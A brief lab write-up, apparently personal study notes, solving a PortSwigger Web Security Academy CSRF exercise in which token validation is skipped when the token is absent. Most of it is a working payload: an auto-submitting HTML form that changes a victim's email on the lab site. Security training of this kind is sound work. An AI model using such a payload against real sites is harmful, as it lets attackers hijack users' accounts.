
#CSRF #CSRF-Tokens 

CSRF where token validation depends on token being present: [link](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

Some applications correctly validate the token when it is present but skip the validation if the token is omitted.

in this challenge you should just escape sending csrf token

**payload :**

```
<html>

<form class="login-form" name="change-email-form"

action="https://0ae9008a04bc104b80848519004b0019.web-security-academy.net/my-account/change-email" method="POST">

<label>Email</label>

<input required="" type="email" name="email" value="neewwmail@gmail.com">

<button class="button" type="submit"> Update email </button>

</form>

<script>

document.forms[0].submit()

</script>

</html>
```